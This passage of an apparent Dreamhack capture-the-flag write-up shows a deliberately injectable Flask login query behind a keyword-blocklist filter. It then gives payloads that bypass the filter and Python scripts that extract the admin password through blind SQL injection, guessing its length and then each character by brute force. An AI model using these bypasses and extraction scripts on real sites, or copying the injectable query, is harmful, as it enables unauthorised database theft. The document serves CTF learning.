'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

We see that there is a `sql vulnerability` in this web, but unfortunately the program has blocked characters and phrases in `keywords` making our query more difficult, so I have bypassed the symbols as follows:

* bypass phrases with `concat()`, e.g. `admin = concat('ad','min')`
* bypass `or` with `||`
* bypass `and` with &&
* bypass comment `-` with `#`

so i tried to check the length with payload: `'||uid=concat('ad','min')&&(length(upw)={i})#` where `i` is the length

the statement will be as follows:
`SELECT * FROM user WHERE uid='' OR (uid='admin' AND length(upw)={i})#`

and the result will return admin if the block `(uid='admin' AND length(upw)={i})` is `true`, otherwise it will return `nothing`

* **script**

```python
import requests

url = "http://host3.dreamhack.games:14247/"

for i in range(50):
    payload = f"'||uid=concat('ad','min')&&(length(upw)={i})#"

    res = requests.get(url, params={"uid": payload})

    if "admin" in res.text:
        print(f"Found length : {i}")
        break

    else: print(f"Trying with {i}")
```

![image](./image/dreamhack/71.png)

`length of upw = 44`

Next we can check if the first 3 characters are `DH{` or not with this payload: {% raw %}`%27%7C%7Cuid%3Dconcat%28%27ad%27%2C%27min%27%29%26%26substr%28upw%2C1%2C3%29%3D%27DH{{%27%23`{% endraw %}

![image](./image/dreamhack/72.png)

![image](./image/dreamhack/73.png)

The result is correct, the next thing we need to do is `bruteforce` each character and we're done.

`script`

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://host3.dreamhack.games:14247/?uid="
charset = string.ascii_lowercase + string.digits + "}"
flag = "DH{"

def try_char(i, c):
    payload = f"%27%7C%7Cuid%3Dconcat%28%27ad%27%2C%27min%27%29%26%26substr%28upw%2C{i}%2C1%29%3D%27{c}%27%23"
    try:
        res = requests.get(url + payload, timeout=3)
        if "admin" in res.text:
            return c
    except:
        pass
    return None

print(f"Flag: {flag}", end="", flush=True) 

for i in range(4, 45):
    found = None
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(try_char, i, c) for c in charset]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result, end="", flush=True) 
                flag += result
                found = result
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found:
        print("\n[!] None", i)
        break

print("\n\nFlag: " + flag)
```

---